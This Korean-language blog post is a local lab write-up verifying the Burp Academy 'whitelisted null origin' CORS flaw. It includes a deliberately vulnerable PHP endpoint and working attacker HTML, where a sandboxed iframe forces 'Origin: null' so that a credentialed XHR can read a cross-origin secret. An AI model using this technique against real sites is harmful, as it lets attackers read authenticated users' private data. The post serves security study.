---
layout: post
title: "Access-Control-Allow-Origin 헤더가 null인 경우 악용가능한지 확인해봤다."
categories: [웹보안, CORS]
tags: [웹보안, CORS, Access-Control-Allow-Origin 헤더]
toc: true
last_modified_at: 2023-06-28 14:02:00 +0900
---


# 개요
CORS의 Access-Control-Allow-Origin 헤더가 null을 회신해줄 때 크로스도메인을 접근이 가능한 경우가 있는지 확인해본다. 
구체적으로는 [Burp Academy CORS 취약점]({% post_url 2023-06-27-burp-academy-cors %})페이지에 있는 `Whitelisted null origin value` 취약점을 검증해보았다. 

# 취약한 환경 준비 
- 로컬환경에 도메인을 설정해서 moon.jp는 로컬호스트(127.0.0.1)로 DNS응답이 가도록 설정했다. 
- `http://moon.jp/cors/cors_null.php` 에 접근하면 secret을 회신해준다. 
- 서버측 php코드는 다음과 같다. 

```php
<?php
  session_start();
  header('Content-Type: application/json');
  header('Access-Control-Allow-Origin: null');
  header('Access-Control-Allow-Credentials: true');
  echo json_encode(array('secret' => 'oajeroj#239idjfls'));

```

# 테스트1. XHR 로 요청하기 
도메인이 상이한 곳(trap.moon.com)에서 Ajax로 위의 서버URL로 요청을 보낸다. 응답에 접근할 수 있을 것인가?

```html
<!-- http://trap.moon.com/cors/cors_null_trap_xhr.html -->
<body>
    <script>
      var req = new XMLHttpRequest();
      req.open('GET', 'http://moon.jp/cors/cors_null.php');  
      req.onreadystatechange = function() {
        // alert(req.responseText);
        if (req.readyState == 4 && req.status == 200) {
            alert(req.responseText);
          }
        
      };
      req.send();
    </script>
</body>
    
```

결과는 실패였다. 서버가 `Access-Control-Allow-Origin: null`를 회신해주더라도 클라이언트측의 Origin헤더의 값이 http://trap.moon.com로, null값과 상이하므로 브라우저가 거부한다. 

![크로스도메인접근테스트](/images/cors-null-test-1.png)

# 테스트2. iframe의 sandbox 속성을 사용해서 요청하기 
iframe의 sandbox 속성을 사용하면 의도적으로 HTTP 요청에 `Origin: null` 헤더를 추가할 수 있다. 다음 코드를 사용했다. 

```html
<!-- http://trap.moon.com/cors/cors_null_trap_iframe.html -->
<body>
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','http://moon.jp/cors/cors_null.php',true);
      req.withCredentials = true;
      req.send();
      
      function reqListener() {
        console.log(this.responseText);
      };
      </script>">
    </iframe>      
</body> 
```

브라우저에서 확인해보면 `Origin: null`헤더가 전송된 것을 확인할 수 있다. 

![Origin: null헤더](/images/cors-null-test-2.png)

console로그를 확인해보면 크로스도메인의 응답에 접근이 가능한 것이 확인된다! 

![크로스도메인 접근 성공](/images/cors-null-test-3.png)

이 것으로 CORS 헤더  `Access-Control-Allow-Origin: null`를 서버가 응답해주는 경우, 의도적으로 `Origin: null`를 발생시키는 테크닉으로 크로스도메인 요청을 가능하게 만들 수 있음(SOP제약을 우회할 수 있음)을 확인했다. 
